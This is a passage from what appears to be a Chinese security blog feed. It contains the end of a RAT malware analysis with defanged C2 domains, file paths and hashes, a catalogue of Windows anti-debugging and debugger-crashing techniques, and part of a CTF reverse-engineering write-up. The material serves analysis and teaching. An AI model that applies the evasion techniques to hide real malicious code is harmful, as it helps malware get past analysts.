title="分析结果"></a>分析结果</h3><p>根据以上分析得出此程序的主要功能：</p><ul><li>受害主机环境识别（CPU信息，系统版本）</li><li>隐藏自身</li><li>重启|关闭计算机</li><li>通过网络传送文件</li><li>常见的文件读写与目录操作</li><li>屏幕截取</li><li>进程遍历|终止某一进程</li><li>操作可移动设备</li><li>远程执行命令</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h3><ul><li>不要浏览不良网站</li><li>及时更新计算机的杀毒程序，但是不要觉得有了杀软保护就可以放松警惕比如此恶意软件的检出率较低</li><li>在计算机控制面板中设置显示文件后缀名，此案例中恶意代码就是将可执行程序伪装成存储有色情图片的文件夹引诱用户点击，因此如果设置显示文件后缀名可以发现此文件后缀是EXE，能在一定程度上看破这种伪装</li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>有趣的是在我分析这个样本时曾将样本上传到VT和微步在线分析过，第一次上传到微步在线的时候只有两个反病毒引擎检测出，但是过了没几分钟刷新了一下页面就发现又多出了两个反病毒引擎识别出了此恶意软件，而且根据腾讯反病毒引擎的识别结果，貌似将这个恶意软件识别为了DNF的木马，（并没有查到腾讯对病毒的命名标准，只是猜测）。</p><p><img src="https://i.loli.net/2019/05/17/5cde2637864b772954.png"></p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h3><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs coq">C2--------------------------------------------------------------<br>         | <span class="hljs-type">http</span>[:]//www[.]softover[.]net/chendog/rat[.]gif<br>         | <span class="hljs-type">cn</span>[.]fetftp[.]nu<br>         | <span class="hljs-type">rt</span>[.]softseek[.]org<br><span class="hljs-keyword">Path</span>-------------------------------------------------------------<br>         | <span class="hljs-type">18xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>\<span class="hljs-number">1.</span>jpg<br>         | <span class="hljs-type">18xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>\<span class="hljs-number">2.</span>jpg<br>         | <span class="hljs-type">18xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>\<span class="hljs-number">3.</span>jpg<br>         | <span class="hljs-type">18xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>\<span class="hljs-number">4.</span>jpg<br>         | <span class="hljs-type">18xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>\<span class="hljs-number">5.</span>jpg<br>         | <span class="hljs-type">18xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>\<span class="hljs-number">6.</span>jpg<br>         | <span class="hljs-type">18xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>\<span class="hljs-number">7.</span>jpg<br>         | <span class="hljs-type">18xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>\Thumbs.db<br>         | <span class="hljs-type">C</span>:\Users\[xxxx]\AppData\<span class="hljs-keyword">Local</span>\Temp\byeyou.tmp<br>         | <span class="hljs-type">C</span>:\Users\[xxxx]\AppData\<span class="hljs-keyword">Local</span>\Temp\rat.EXE<br>         | <span class="hljs-type">C</span>:\ProgramData\Microsoft\Comon\ctfmon.exe<br>String-----------------------------------------------------------<br>         | <span class="hljs-type">sfctlcom</span>.exe<br>         | <span class="hljs-type">pavfnsvr</span>.exe<br>         | <span class="hljs-type">regedit</span>.exe /s /e  %s\back1.reg <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders&quot;</span><br>Filename---------------------------------------------------------<br>         | <span class="hljs-type">18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>.EXE<br>         | <span class="hljs-type">ctfmon</span>.exe<br>         | <span class="hljs-type">rat</span>.EXE<br>         | <span class="hljs-type">byeyou</span>.tmp<br>         | <span class="hljs-type">Thumbs</span>.db<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;样本主体分析18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx-EXE&quot;&gt;&lt;a href=&quot;#样本主体分析18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx-EXE&quot; class=&quot;headerlink&quot; title=&quot;样本主体分析18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx.EXE&quot;&gt;&lt;/a&gt;样本主体分析18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx.EXE&lt;/h2&gt;&lt;h3 id=&quot;样本基本信息：&quot;&gt;&lt;a href=&quot;#样本基本信息：&quot; class=&quot;headerlink&quot; title=&quot;样本基本信息：&quot;&gt;&lt;/a&gt;样本基本信息：&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;属性&lt;/th&gt;
&lt;th&gt;值&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;Filename&lt;/td&gt;
&lt;td&gt;18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx.EXE&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MD5&lt;/td&gt;
&lt;td&gt;b9b34748f958c31e12ae3741f728be99&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SHA-1&lt;/td&gt;
&lt;td&gt;a806386497e280612eadbe87e2104550c95ab617&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;File Type&lt;/td&gt;
&lt;td&gt;Win32 EXE&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Magic&lt;/td&gt;
&lt;td&gt;MS-DOS executable PE  for MS Windows (GUI) Intel 80386 32-bit&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SSDeep&lt;/td&gt;
&lt;td&gt;12288:DKGk6+Tjk6PQEAEd0bpkRgNyPBODdgVRX6Tw:Dz+TwNE0NfcAT&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;File Size&lt;/td&gt;
&lt;td&gt;467.39 KB&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&quot;静态分析&quot;&gt;&lt;a href=&quot;#静态分析&quot; class=&quot;headerlink&quot; title=&quot;静态分析&quot;&gt;&lt;/a&gt;静态分析&lt;/h3&gt;&lt;p&gt;18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx.EXE&lt;/p&gt;</summary>
    
    
    
    <category term="Windows恶意代码" scheme="https://www.hvnt3r.top/categories/Windows%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    
    <category term="Windows恶意代码" scheme="https://www.hvnt3r.top/tags/Windows%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="远程控制" scheme="https://www.hvnt3r.top/tags/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/"/>
    
    <category term="木马" scheme="https://www.hvnt3r.top/tags/%E6%9C%A8%E9%A9%AC/"/>
    
    <category term="分析报告" scheme="https://www.hvnt3r.top/tags/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
    
  </entry>
  
  <entry>
    <title>WallpaperEngine资源提取</title>
    <link href="https://www.hvnt3r.top/2019/05/WallpaperEngine%E8%B5%84%E6%BA%90%E6%8F%90%E5%8F%96/"/>
    <id>https://www.hvnt3r.top/2019/05/WallpaperEngine%E8%B5%84%E6%BA%90%E6%8F%90%E5%8F%96/</id>
    <published>2019-05-17T05:09:44.000Z</published>
    <updated>2022-02-16T12:06:42.855Z</updated>
    
    <content type="html"><![CDATA[<p>有时在WallpaperEngine中发现自己喜欢的静态壁纸想将其中图片从包文件提取出来的话直接在Kali Linux中运行命令：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">foremost</span> 包文件<br></code></pre></td></tr></table></figure><p>在output文件夹中可以看到提取出来的内容。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;有时在WallpaperEngine中发现自己喜欢的静态壁纸想将其中图片从包文件提取出来的话直接在Kali Linux中运行命令：&lt;/p&gt;
&lt;figure class=&quot;highlight nginx&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;</summary>
      
    
    
    
    <category term="生活" scheme="https://www.hvnt3r.top/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="小窍门" scheme="https://www.hvnt3r.top/tags/%E5%B0%8F%E7%AA%8D%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>Windows反调试实现与绕过姿势汇总</title>
    <link href="https://www.hvnt3r.top/2019/05/Windows%E5%8F%8D%E8%B0%83%E8%AF%95%E5%AE%9E%E7%8E%B0%E4%B8%8E%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/"/>
    <id>https://www.hvnt3r.top/2019/05/Windows%E5%8F%8D%E8%B0%83%E8%AF%95%E5%AE%9E%E7%8E%B0%E4%B8%8E%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/</id>
    <published>2019-05-07T11:05:15.000Z</published>
    <updated>2022-02-16T12:06:42.855Z</updated>
    
    <content type="html"><![CDATA[<h2 id="调试器检测"><a href="#调试器检测" class="headerlink" title="调试器检测"></a>调试器检测</h2><h3 id="PEB相关"><a href="#PEB相关" class="headerlink" title="PEB相关"></a>PEB相关</h3><h4 id="BeingDebugged"><a href="#BeingDebugged" class="headerlink" title="BeingDebugged"></a>BeingDebugged</h4><p>BeingDebugged是位于PEB（Process Environment Block，进程环境块）偏移0x2处的标志。</p><h4 id="IsDebuggerPresent"><a href="#IsDebuggerPresent" class="headerlink" title="IsDebuggerPresent()"></a>IsDebuggerPresent()</h4><p><code>IsDebuggerPresent()</code>是Windows的API，这个函数通过查询PEB中的BeingDebugged标志来判断当前进程是否处于被调试状态。</p><h4 id="NtGlobalFlag"><a href="#NtGlobalFlag" class="headerlink" title="NtGlobalFlag"></a>NtGlobalFlag</h4><p>NtGlobalFlag位于PEB的0x068h处，如果BeingDebugged被设置为TRUE，则NtGlobalFlag的值为70h。</p><h4 id="CheckRemoteDebuggerPresent"><a href="#CheckRemoteDebuggerPresent" class="headerlink" title="CheckRemoteDebuggerPresent()"></a>CheckRemoteDebuggerPresent()</h4><p>CheckRemoteDebuggerPresent( )与IsDebuggerPresent( )类似，同为Windows API，可以直接调用，<code>CheckRemoteDebuggerPresent()</code>实际调用了NtQueryInformationProcess()，查询某个进程的ProcessDebugPort即系统与调试器通信的端口句柄，CheckRemoteDebuggerPresent()通过查询这个值来确定程序是否处于调试状态。</p><span id="more"></span><h4 id="ProcessHeap"><a href="#ProcessHeap" class="headerlink" title="ProcessHeap"></a>ProcessHeap</h4><p>ProcessHeap位于PEB的0x018，处正常情况下，系统为进程创建一个堆，会将进程堆位于+0x00c处的Flags设置为2，将位于+0x010处的ForceFlags设置为0，但在调试状态下这两个位置的值会发生改变。</p><h3 id="基于系统痕迹"><a href="#基于系统痕迹" class="headerlink" title="基于系统痕迹"></a>基于系统痕迹</h3><h4 id="父进程检测"><a href="#父进程检测" class="headerlink" title="父进程检测"></a>父进程检测</h4><p>一个进程被正常启动时，其父进程一般是Explore.exe文件资源管理器、cmd.exe、或者Services.exe系统服务。如果一个进程的父进程不是这些进程，可以怀疑其被调试了。</p><h4 id="堆数据检测"><a href="#堆数据检测" class="headerlink" title="堆数据检测"></a>堆数据检测</h4><p>由于BeingDebugged被设置为TRUE，NtGlobalFlag设置了FLG_HEAP_VALIDATE_PARAMETERS，RtlCreateHeap函数用RtlDebugCteateHeap函数创建堆，与此同时在堆中填充数据：<code>BA AD F0 0D</code>、<code>FE EE FE EE</code>、<code>AB AB AB AB</code>，如果这些数据出现的次数较多（大于10次）则说明被调试了。</p><h4 id="注册表检测"><a href="#注册表检测" class="headerlink" title="注册表检测"></a>注册表检测</h4><p>下面是调试器在注册表中的一个常用位置。</p><p>SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug(32位系统)</p><p>SOFTWARE\Wow6432Node\Microsoft\WindowsNT\CurrentVersion\AeDebug(64位系统)</p><p>该注册表项指定当应用程序发生错误时，触发哪一个调试器。默认情况下，它被设置为Dr.Watson。如果该这册表的键值被修改为OllyDbg，则恶意代码就可能确定它正在被调试。</p><h4 id="进程遍历"><a href="#进程遍历" class="headerlink" title="进程遍历"></a>进程遍历</h4><p>枚举进程中是否有调试器进程。</p><h4 id="窗口遍历"><a href="#窗口遍历" class="headerlink" title="窗口遍历"></a>窗口遍历</h4><p>枚举主窗口的标题，判断是否有调试器窗口，与上面的进程检测方法一样，这样的反调试很容易绕过。</p><h3 id="基于调试器行为的检测"><a href="#基于调试器行为的检测" class="headerlink" title="基于调试器行为的检测"></a>基于调试器行为的检测</h3><h4 id="硬件断点检测"><a href="#硬件断点检测" class="headerlink" title="硬件断点检测"></a>硬件断点检测</h4><p>调试器使用DR0~Dr3作为硬件断点，通过检查这几个寄存器的值是否为空来确定当前程序是否被调试。</p><h4 id="软件断点检测"><a href="#软件断点检测" class="headerlink" title="软件断点检测"></a>软件断点检测</h4><p>调试器软件断点是将断点处的指令替换为INT 3，当程序运行到这一条指令时会调用异常处理例程，从而检查内存中INT 3指令的机器码0xCC可以检查软件断点。除了INT 3还有INT 2D、CD03。</p><h4 id="检测DBGHELP模块"><a href="#检测DBGHELP模块" class="headerlink" title="检测DBGHELP模块"></a>检测DBGHELP模块</h4><p>调试器一般使用微软提供的DBGHELP库来装载调试符号，如果一个进程装载了DBGHELP.DLL那么这个进程很可能是一个调试器。</p><h4 id="代码CRC值校验"><a href="#代码CRC值校验" class="headerlink" title="代码CRC值校验"></a>代码CRC值校验</h4><p>通过对需要保护的代码进行CRC校验或者MD5值校验可以保证这部分代码不被篡改且无法下软断点。</p><h4 id="SetUnhandledExceptionFilter"><a href="#SetUnhandledExceptionFilter" class="headerlink" title="SetUnhandledExceptionFilter"></a>SetUnhandledExceptionFilter</h4><p>在进程发生异常的时候若SEH未处理或者注册的SEH不存在，则会调用UnhandledExceptionFilter，它会运行系统最后的异常处理器，UnhandledExceptionFilter会判断当前进程是否被调试，如果处于被调试状态则将异常传递给调试器，若进程没有被调试则将异常传递给系统最后的异常处理器。使用SetUnhandledExceptionFilter可以修改系统最后的处理器，我们可以修改系统最后的异常处理器为正常逻辑中的一个过程，经由这个正常逻辑过程运行的程序才能正常运行，达到反调试效果。</p><h3 id="其他检测方法"><a href="#其他检测方法" class="headerlink" title="其他检测方法"></a>其他检测方法</h3><h4 id="TrapFlag检测"><a href="#TrapFlag检测" class="headerlink" title="TrapFlag检测"></a>TrapFlag检测</h4><p>CPU中有一个eflags标志位叫做Trap Flag，如果TF为1，CPU执行指令后会产生一个单步异常，因此可以提前在程序中设置可以跳转到正确程序逻辑的SEH，在触发异常之后，如果进入SEH中则程序可以正常运行，如果没有进入SEH则说明程序处于调试状态。</p><h4 id="ZwQuerySystemInformation"><a href="#ZwQuerySystemInformation" class="headerlink" title="ZwQuerySystemInformation()"></a>ZwQuerySystemInformation()</h4><p>在函数ZwQuerySystemInformation( )中，当SystemInformation&#x3D;SystemKernelDebuggerInformation，判断DebuggerEnabled和DebuggerNotPresent()的值可以探测系统调试器是否存在。</p><h4 id="SeDebugPrivilege权限检测"><a href="#SeDebugPrivilege权限检测" class="headerlink" title="SeDebugPrivilege权限检测"></a>SeDebugPrivilege权限检测</h4><p>正常进程不具有SeDebugPrivilege权限，但是调试器具有此权限，当进程从调试器加载时，进程会继承调试器的SeDebugPrivilege权限。可以通过打开CSRSS.EXE进程间接地检查进程是否有SeDebugPrivilege权限，因为默认权限无法对CSRSS.EXE进行OPENPROCESS。</p><h4 id="TLS回调函数"><a href="#TLS回调函数" class="headerlink" title="TLS回调函数"></a>TLS回调函数</h4><p>实际上并不是程序在加载到调试器后，会让第一条指令执行之前而暂停程序的运行，而是调试器从程序PE头部指定的入口点开始。TLS回调被用来在程序入口点执行之前运行代码，因为这些代码可以在调试器中秘密地执行。</p><p>TLS是Windows的一个存储类，其中数据对象不是一个自动的堆栈变量，而是代码中运行的每个线程的一个本地变量，TLS允许每个线程维护一个用TLS声明的专有变量，在应用程序实现TLS的情况下，可执行程序的PE头部会包含一个<code>.tls</code>段。TLS提供了初始化和终止TLS对象的回调函数。使用<code>PEView</code>可以看到<code>.tls</code>段，正常程序不会使用这个段。可以使用调试器在TLS回调函数运行之前下断点来分析这些函数。</p><h4 id="DebugObject"><a href="#DebugObject" class="headerlink" title="DebugObject"></a>DebugObject</h4><p>在调试器附加到一个进程的过程中会调用ZwCreateDebugObject创建DebugObject，正常的进程中DebugObject为NULL，如果不是NULL则说明有一个用户态调试器的进程。使用ZwQueryObject查询所有对象的类型，如果DebugObject的数目不为零则说明系统中存在调试器。</p><h4 id="运行时间差检测"><a href="#运行时间差检测" class="headerlink" title="运行时间差检测"></a>运行时间差检测</h4><p>当一个程序运行过程中出现异常时，会将异常传递给调试器由调试器决定处理异常的过程，但是在这个过程中程序运行所需的事件比程序自身直接执行的时间要长很多，因此可以计算一个操作运行的时间来判断当前程序是否正在被调试，常用的方法是RDTSC指令和GetTickCount()函数。</p><h3 id="已失效的方法"><a href="#已失效的方法" class="headerlink" title="已失效的方法"></a>已失效的方法</h3><h4 id="GetLastError"><a href="#GetLastError" class="headerlink" title="GetLastError( )"></a>GetLastError( )</h4><p>虽然这个方法在较新版本的Windows中不再使用，但是我们还是可以了解一下原理。</p><p>使用GetLastError( )可以得到程序运行过程中的出现的错误的原因，在程序出现错误时会改变此函数的返回值，而可以利用此原理首先使用SetLastError()设置LastError为某值，然后通过故意的与调试器相关的错误调用如OutputDebugString()使得程序中出现错误，如果当前程序被调试则OutputDebugString()成功调用因此LastError的值不会改变，但是如果没有被调试则LastError的值会因为OutputDebugString()没有成功调用而发生改变，通过前后LastError的值的对比来判断程序被调试。</p><h2 id="干扰调试器"><a href="#干扰调试器" class="headerlink" title="干扰调试器"></a>干扰调试器</h2><h4 id="Drx寄存器清理"><a href="#Drx寄存器清理" class="headerlink" title="Drx寄存器清理"></a>Drx寄存器清理</h4><p>OllyDbg在捕获到一个异常时，会将Dr0~Dr7清零，但是如果设置SEH使用这些寄存器中的数据参与运算，通过对比运算结果是否正确可以判断这些寄存器是否被清空即可判断程序是否被OllyDbg调试。</p><h4 id="OutputDebugStringA"><a href="#OutputDebugStringA" class="headerlink" title="OutputDebugStringA"></a>OutputDebugStringA</h4><p>此函数被用来向调试器发送一个格式化的串，但是OllyDbg1.1版本之前存在一个格式化字符串漏洞，使用类似如下的调用形式会触发此漏洞使OllyDbg崩溃：</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">OutputDebugStringA(&quot;<span class="hljs-variable">%s%</span>s<span class="hljs-variable">%s%</span>s<span class="hljs-variable">%s%</span>s<span class="hljs-variable">%s%</span>s%s&quot;);<br></code></pre></td></tr></table></figure><h4 id="ThreadHideFromDebugger"><a href="#ThreadHideFromDebugger" class="headerlink" title="ThreadHideFromDebugger"></a>ThreadHideFromDebugger</h4><p>设置ThreadHideFromDebugger可以禁止为某个线程产生调试事件。</p><h4 id="EnableWindow"><a href="#EnableWindow" class="headerlink" title="EnableWindow"></a>EnableWindow</h4><p>调用这个API可以暂时锁定前台的窗口：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">EnableWindow(GetForegrounfWindow(),FALSE);<br></code></pre></td></tr></table></figure><h4 id="BlockInput"><a href="#BlockInput" class="headerlink" title="BlockInput"></a>BlockInput</h4><p>调用<code>BlockInput(TRUE)</code>锁住窗口，完成工作之后使用<code>BlockWindow(FALSE)</code>恢复。锁住期间可以通过<code>Ctrl+Alt+Del</code>组合键强制解除输入锁。</p><h4 id="防止被调试器附加"><a href="#防止被调试器附加" class="headerlink" title="防止被调试器附加"></a>防止被调试器附加</h4><p>Ring3调试器的附加使用的是DebugActiveProcess函数，在附加相关进程时，会首先执行到ntdll.dll下的ZwContinue函数，最后停留在ntdll.dll的DbgBreakPoint处。因此Hook一下ZwContinue函数可以实现防止进程被调试器附加的效果。</p><p>参考资料：</p><p>《恶意代码分析实战》</p><p>《加密与解密》第四版</p><p><a href="https://www.cnblogs.com/xiao-zhang/p/5245068.html">https://www.cnblogs.com/xiao-zhang/p/5245068.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;调试器检测&quot;&gt;&lt;a href=&quot;#调试器检测&quot; class=&quot;headerlink&quot; title=&quot;调试器检测&quot;&gt;&lt;/a&gt;调试器检测&lt;/h2&gt;&lt;h3 id=&quot;PEB相关&quot;&gt;&lt;a href=&quot;#PEB相关&quot; class=&quot;headerlink&quot; title=&quot;PEB相关&quot;&gt;&lt;/a&gt;PEB相关&lt;/h3&gt;&lt;h4 id=&quot;BeingDebugged&quot;&gt;&lt;a href=&quot;#BeingDebugged&quot; class=&quot;headerlink&quot; title=&quot;BeingDebugged&quot;&gt;&lt;/a&gt;BeingDebugged&lt;/h4&gt;&lt;p&gt;BeingDebugged是位于PEB（Process Environment Block，进程环境块）偏移0x2处的标志。&lt;/p&gt;
&lt;h4 id=&quot;IsDebuggerPresent&quot;&gt;&lt;a href=&quot;#IsDebuggerPresent&quot; class=&quot;headerlink&quot; title=&quot;IsDebuggerPresent()&quot;&gt;&lt;/a&gt;IsDebuggerPresent()&lt;/h4&gt;&lt;p&gt;&lt;code&gt;IsDebuggerPresent()&lt;/code&gt;是Windows的API，这个函数通过查询PEB中的BeingDebugged标志来判断当前进程是否处于被调试状态。&lt;/p&gt;
&lt;h4 id=&quot;NtGlobalFlag&quot;&gt;&lt;a href=&quot;#NtGlobalFlag&quot; class=&quot;headerlink&quot; title=&quot;NtGlobalFlag&quot;&gt;&lt;/a&gt;NtGlobalFlag&lt;/h4&gt;&lt;p&gt;NtGlobalFlag位于PEB的0x068h处，如果BeingDebugged被设置为TRUE，则NtGlobalFlag的值为70h。&lt;/p&gt;
&lt;h4 id=&quot;CheckRemoteDebuggerPresent&quot;&gt;&lt;a href=&quot;#CheckRemoteDebuggerPresent&quot; class=&quot;headerlink&quot; title=&quot;CheckRemoteDebuggerPresent()&quot;&gt;&lt;/a&gt;CheckRemoteDebuggerPresent()&lt;/h4&gt;&lt;p&gt;CheckRemoteDebuggerPresent( )与IsDebuggerPresent( )类似，同为Windows API，可以直接调用，&lt;code&gt;CheckRemoteDebuggerPresent()&lt;/code&gt;实际调用了NtQueryInformationProcess()，查询某个进程的ProcessDebugPort即系统与调试器通信的端口句柄，CheckRemoteDebuggerPresent()通过查询这个值来确定程序是否处于调试状态。&lt;/p&gt;</summary>
    
    
    
    <category term="二进制安全" scheme="https://www.hvnt3r.top/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="反调试" scheme="https://www.hvnt3r.top/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>2019全国大学生信息安全竞赛初赛PWN-Reverse-WriteUp</title>
    <link href="https://www.hvnt3r.top/2019/04/2019%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9BPWN-Reverse-WriteUp/"/>
    <id>https://www.hvnt3r.top/2019/04/2019%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9BPWN-Reverse-WriteUp/</id>
    <published>2019-04-29T00:34:44.000Z</published>
    <updated>2022-02-16T12:06:42.855Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="0x01-easyGo"><a href="#0x01-easyGo" class="headerlink" title="0x01 easyGo"></a>0x01 easyGo</h2><p><img src="https://i.loli.net/2019/04/29/5cc64745afb8d.png"></p><span id="more"></span><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">hvnt3r@LAPTOP-POUA9UHC:/mnt/e/linux$ file easygo<br>easygo: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped<br>hvnt3r@LAPTOP-POUA9UHC:/mnt/e/linux$ ./easyGo<br>Please input you flag like flag&#123;123&#125; to judge:<br>flag&#123;1212121&#125;<br>Try again! Come on!<br></code></pre></td></tr></table></figure><p>Go的逆向，先用<code>IDAGolangHelper</code>恢复函数名，在<code>main_main</code>函数中找到<code>base64</code>加密，在函数位置下断点，<code>gdb</code>中单步运行，执行完<code>encoding_base64__ptr_Encoding_DecodeString</code>之后可以在<code>RSI</code>中看到<code>flag</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">[----------------------------------registers-----------------------------------]<br>RAX: 0x2a (<span class="hljs-string">&#x27;*&#x27;</span>)<br>RBX: 0x2a (<span class="hljs-string">&#x27;*&#x27;</span>)<br>RCX: 0x0 <br>RDX: 0x0 <br>RSI: 0xc000098060 (<span class="hljs-string">&quot;flag&#123;92094daf-33c9-431e-a85a-8bfbd5df98ad&#125;&quot;</span>)<br>RDI: 0x38 (<span class="hljs-string">&#x27;8&#x27;</span>)<br>RBP: 0xc000092f88 --&gt; 0xc000092f90 --&gt; 0x429b1c (mov    eax,DWORD PTR [rip+0x16478e]        <span class="hljs-comment"># 0x58e2b0)</span><br>RSP: 0xc000092e90 --&gt; 0xc000096580 (<span class="hljs-string">&quot;6789_-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345&quot;</span>, <span class="hljs-string">&#x27;\377&#x27;</span> &lt;repeats 45 <span class="hljs-built_in">times</span>&gt;, <span class="hljs-string">&quot;\005\377\377:;&lt;=&gt;?&quot;</span>)<br>RIP: 0x4952f0 (mov    rax,QWORD PTR [rsp+0x38])<br>R8 : 0x0 <br>R9 : 0x0 <br>R10: 0x2a (<span class="hljs-string">&#x27;*&#x27;</span>)<br>R11: 0x2a (<span class="hljs-string">&#x27;*&#x27;</span>)<br>R12: 0xc000098060 (<span class="hljs-string">&quot;flag&#123;92094daf-33c9-431e-a85a-8bfbd5df98ad&#125;&quot;</span>)<br>R13: 0xc000096580 (<span class="hljs-string">&quot;6789_-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345&quot;</span>, <span class="hljs-string">&#x27;\377&#x27;</span> &lt;repeats 45 <span class="hljs-built_in">times</span>&gt;, <span class="hljs-string">&quot;\005\377\377:;&lt;=&gt;?&quot;</span>)<br>R14: 0x2a (<span class="hljs-string">&#x27;*&#x27;</span>)<br>R15: 0x40 (<span class="hljs-string">&#x27;@&#x27;</span>)<br>EFLAGS: 0x206 (carry PARITY adjust zero sign <span class="hljs-built_in">trap</span> INTERRUPT direction overflow)<br></code></pre></td></tr></table></figure><p><strong>flag：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs flag">flag&#123;92094daf-33c9-431e-a85a-8bfbd5df98ad&#125;<br></code></pre></td></tr></table></figure><h2 id="0x02-bbvvmm"><a href="#0x02-bbvvmm" class="headerlink" title="0x02 bbvvmm"></a>0x02 bbvvmm</h2><p><img src="https://i.loli.net/2019/04/29/5cc647867d4e3.png"></p><h2 id="0x03-strange-int"><a href="#0x03-strange-int" class="headerlink" title="0x03 strange_int"></a>0x03 strange_int</h2><p><img src="https://i.loli.net/2019/04/29/5cc647ad8df45.png"></p><h2 id="0x04-计时挑战"><a href="#0x04-计时挑战" class="headerlink" title="0x04 计时挑战"></a>0x04 计时挑战</h2><p><img src="https://i.loli.net/2019/04/29/5cc647deb4d25.png"></p><h2 id="0x05-where-u-are"><a href="#0x05-where-u-are" class="headerlink" title="0x05 where_u_are"></a>0x05 where_u_are</h2><p><img src="https://i.loli.net/2019/04/29/5cc6480bf38ce.png"></p><h1 id="RWN"><a href="#RWN" class="headerlink" title="RWN"></a>RWN</h1><h2 